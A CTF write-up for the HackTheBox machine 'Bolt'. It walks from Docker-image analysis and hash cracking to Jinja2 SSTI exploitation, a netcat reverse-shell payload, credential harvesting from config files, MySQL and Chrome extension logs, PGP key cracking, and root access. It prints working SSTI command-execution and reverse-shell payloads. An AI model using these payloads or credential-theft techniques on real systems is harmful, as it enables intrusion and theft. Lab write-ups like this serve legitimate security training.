In this Hackthebox we will go analyze a docker img files and from there will find some juicy stuff will help us login to a vhost "demo" which has some functions aren't in the main web application , from there we will exploit SSTI and gain low-privilege shell as www-data , during box enumeration we will find some passwords in the system which will let us get a user access , after that we will connect to a mysql database then will find a PGP encrypted message , somehow will gain the user private gpg key to decrypt the message which contains the root password .

```

- if we do a full port scan it won't return any new ports so now we can start our enumeration process.

- we can notice from the nmap scan` commonName=passbolt.bolt.htb` so we can add
  `bolt.htb` and `pass.bolt.htb ` to our `/etc/hosts`

- we can also search for other potential vhosts now :

```bash
ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://bolt.htb -H "Host: FUZZ.bolt.htb" -fw  10870

mail                    [Status: 200, Size: 4943, Words: 345, Lines: 99]
demo                    [Status: 302, Size: 219, Words: 22, Lines: 4]
```

- we can add them all to the `/etc/hosts` as well

## Enumeration :

- visiting the web application at `bolt.htb` or `passbolt.bolt.htb` we are introduced with :

![error](/assets/images/Bolt/20220224093240.png)

- there is a feedback form at the end but it doesn't work
- we can start viewing the pages at the application :

![error](/assets/images/Bolt/20220224093405.png)

- at `/download` there is a file we can download so let's download it and see what it contains

![error](/assets/images/Bolt/20220224093429.png)

- extracting the `image.tar` we can see it contains :

![error](/assets/images/Bolt/20220224093713.png)

- each directory contains a `layer.tar ` file , we can utilize some bash magic to extract them all :

```bash
#!/usr/bin/bash
for file in $( ls -d */)
do
tar -xf  $file/layer.tar -C $file/
done
```

- now we can use `tree` command to have an overview what does the files contains then we can start checking them manually

![error](/assets/images/Bolt/20220224100331.png)

at `745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/` will find a `config.py` file

- reading it will find :

![error](/assets/images/Bolt/20220224100409.png)

- and it loads `db.sqlite3 ` we can start searching for it in all image layers maybe we find it and we did :

```bash
# under img dir
find . -name db.sqlite3
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3
```

- now we can open it and will find :

![error](/assets/images/Bolt/20220224100831.png)

```
admin@bolt.htb:$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.
```

we can try to crack this hash with JTR :

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt admin@bolt.htb_hash
# password:deadbolt
```

great we have credentials we can try to login at the web application with it and we are in:

![error](/assets/images/Bolt/20220224101458.png)

- let's see where else we can utilize these valid credentials , we can visit `mail.bolt.htb ` but it didn't work :( .
- we can also visit `demo.bolt.htb` and it also doesn't work however it contains a registration function :
- it needs a ticket to create an account

![error](/assets/images/Bolt/20220224102126.png)

- navigating through img files will see at `41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/` some source codes we can check `routes.py` and we will see :

![error](/assets/images/Bolt/20220224103501.png)

- seems like invitation code we can try to register at `demo.bolt.htb` with it .
- we create account successfully and can login with it :

![error](/assets/images/Bolt/20220224103833.png)

- we can also login to `mail.bolt.htb ` with our new credentials , they seem to be connected somehow

![error](/assets/images/Bolt/20220224103947.png)

## Enumeration Harder

- now as we are logged in in all the web applications we should have notice that `demo.bolt.htb` and `bolt.htb` are pretty much the same however in the `demo` there are more features and pages we can access .
- we now are searching for any input at any page to test it
- at demo and under profile page we have this setting tab which has input option :

![error](/assets/images/Bolt/20220224104439.png)

- we can test it

![error](/assets/images/Bolt/20220224104528.png)

- and instantly at `mail.bolt.htb` an email has received

![error](/assets/images/Bolt/20220224104619.png)

- and when we pressed the link another mail has received :

![error](/assets/images/Bolt/20220224104701.png)

- so now we have understood how the web applications function together we can test these input fields for potential vulnerabilities .
- we have seen in the source codes "flask" a lot so we can test [SSTI](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee) .

## exploitation :

testing SSTI can began with a basic test like :

![error](/assets/images/Bolt/20220224105201.png)

- we now will receive first mail to confirm and 2nd one with the response :

![error](/assets/images/Bolt/20220224105326.png)

- Nice we have a valid SSTI exploit at the name field , we can try to leverage it to RCE with payload like [those](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('whoami').read() }}
```

response :

![error](/assets/images/Bolt/20220224105554.png)

so now we can get a reverse shell with :

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ip> 9999 >/tmp/f').read() }}
```

## Foothold :

and we have our shell as www-data :

![error](/assets/images/Bolt/20220224105825.png)

- if we look around we will find a lot of files to explore , we can use **Linpeas** to guide us where to look first and non expected files in some directories and if there is a path to escalate our privilege .

- we can check `roundcube/config/config.inc.php` and will find :

![error](/assets/images/Bolt/20220224120011.png)

which is a potential password we can use latter

- also there is `/etc/passbolt` we can check it
- to search for potential passwords in it we can use :

```bash
grep --color=auto -rnw '.' -Rie "password" --color=always 2>/dev/null
# ./passbolt.php:42:            'password' => 'rT2;jW7<eY8!dX8}pQ8%',
```

![error](/assets/images/Bolt/20220224114429.png)

we can try to see if we can access the mysql database :

```
passbolt:rT2;jW7<eY8!dX8}pQ8%
```

```bash
www-data@bolt:/etc/passbolt$ mysql -u passbolt -D passboltdb -p
# mysql>
```

- and we have connected successfully , we can now see if there is anything interesting for us

```bash
mysql > SHOW databases ; # list them
mysql > use passboltdb;
mysql > show tables; # list tables
mysql > Describe secrets ; # found table secrets seems interesting
```

- will find this PGP message inside the column data of table secrets :

![error](/assets/images/Bolt/20220224115251.png)

- so far we didn't find a potential factor to escalate to `eddie` or `clarck`
- however we have collected some passwords we can test them as ssh credentials with any user .

## Eddie user :

![error](/assets/images/Bolt/20220224120424.png)

- now we can ssh to the eddie user :

![error](/assets/images/Bolt/20220224120528.png)

- Back to our linpeas output we had :

![error](/assets/images/Bolt/20220224121919.png)

- and he had one mail from clark contains :

![error](/assets/images/Bolt/20220224122018.png)

```
Go ahead and download the extension to your browser and get logged in.  Be sure to back up your private key because I CANNOT recover it
```

- so we should search for this browser to see what is this mail about
- we can find google-chrome is the browser mentioned

![error](/assets/images/Bolt/20220224122359.png)

- now we want to get eddie private key to be able to read the message we have seen before in the MySQL DB .
- we can start searching for it inside the chrome folder we just hit .

```bash
eddie@bolt:~/.config/google-chrome$ grep "PRIVATE KEY" -r .
```

will find some results just have the header and not the key itself , but will find :

```
Binary file ./Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log matches
```

seems promising , now to grep in a binary you should use "-a" which means all even binaries .

![error](/assets/images/Bolt/20220224123711.png)

and here it is now you can copy it then replace "\r\n" with new line and you now have the private key

![error](/assets/images/Bolt/20220224123755.png)

### Decrypting the message

now to decrypt a PGP encrypted message we will use :

```bash
$ gpg --import eddie_private
$ gpg -d message.inc
```

but it asks for a passphrase to import the gpg key

![error](/assets/images/Bolt/20220224124020.png)

- we can utilize **gpg2john** to get the hash then **john** to crack it

```bash
$ gpg2john eddie_private > eddie_key_hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt eddie_key_hash
```

![error](/assets/images/Bolt/20220224124928.png)

- now we can decrypt the message :

![error](/assets/images/Bolt/20220224125124.png)

## Root Access

using the password we just found in the message : `Z(2rmxsNW(Z?3=p/9s` we get the root access

![error](/assets/images/Bolt/20220224125233.png)
